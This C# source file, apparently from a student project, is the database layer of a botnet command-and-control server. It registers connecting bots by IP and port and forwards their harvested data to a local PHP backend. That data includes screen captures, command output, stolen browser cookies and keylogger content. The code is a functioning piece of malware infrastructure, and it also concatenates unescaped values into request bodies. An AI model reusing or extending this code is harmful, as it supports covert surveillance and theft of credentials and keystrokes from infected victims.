//-- for further improvement: put all webclient in try-catch

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ListView;

namespace Server
{
    internal class DB
    {
        public static void addNewBot(TcpClient client)
        {
            IPEndPoint remoteEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;
            string ip = remoteEndPoint.Address.ToString();
            int port = remoteEndPoint.Port;
            string post = "opt=add&ip=" + ip + "&port=" + port;
            WebClient wc = new WebClient();
            wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            Console.WriteLine(ip);
            Console.WriteLine(port);
            wc.UploadString("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Bot.php", post);
            //  Gửi yêu cầu POST đến URL với dữ liệu là nội dung chuỗi post
        }
        public static void insertDB(string id, string type, string detail, string content)
        {
            WebClient wc = new WebClient();
            wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            if (type.Equals("capture"))
            {
                wc.UploadString("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Capture.php", "opt=add&idbot=" + id + "&detail=" + detail + "&content=" + content);
            }
            else if (type.Equals("cmd"))
            {
                wc.UploadString("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Cmd.php", "opt=add&idbot=" + id + "&detail=" + detail + "&content=" + content);
            }
            else if (type.Equals("cookies"))
            {
                wc.UploadString("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Cookies.php", "opt=add&idbot=" + id + "&detail=" + detail + "&content=" + content);
            }
            else if (type.Equals("keylogger"))
            {
                content = Uri.EscapeDataString(content);
                wc.UploadString("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Keylogger.php", "opt=add&idbot=" + id + "&detail=" + detail + "&content=" + content);
            }
        }
        public static void resetBotStatus()
        {
            WebClient wc = new WebClient();
            string url = "http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Bot.php?opt=resetStatus";
            wc.DownloadData(url);
        }
        public static void resetCommandBot()
        {
            WebClient wc = new WebClient();
            string url = "http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Bot.php?opt=resetCommand";
            wc.DownloadData(url);
        }
        public static string getIdByIpAndPort(String ip, String port)
        {
            using (WebClient wc = new WebClient())
            {
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                NameValueCollection data = new NameValueCollection();
                data["ip"] = ip;
                data["port"] = port;
                byte[] responseBytes = wc.UploadValues("http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Bot.php?opt=getId", "POST", data);

                string response = Encoding.UTF8.GetString(responseBytes);

                return response;
            }
        }
        public static void resetStatusBotByIpAndPort(string IpAndPort)
        {
            string Ip = IpAndPort.Split(':')[0];
            string Port = IpAndPort.Split(':')[1];
            string Id = getIdByIpAndPort(Ip, Port);

            WebClient wc = new WebClient();
            string url = "http://localhost:7777/PBL4_PHP_MAIN/Controller/C_Bot.php?opt=resetStatus&ID=" + Id;
            wc.DownloadData(url);
        }
    }
}
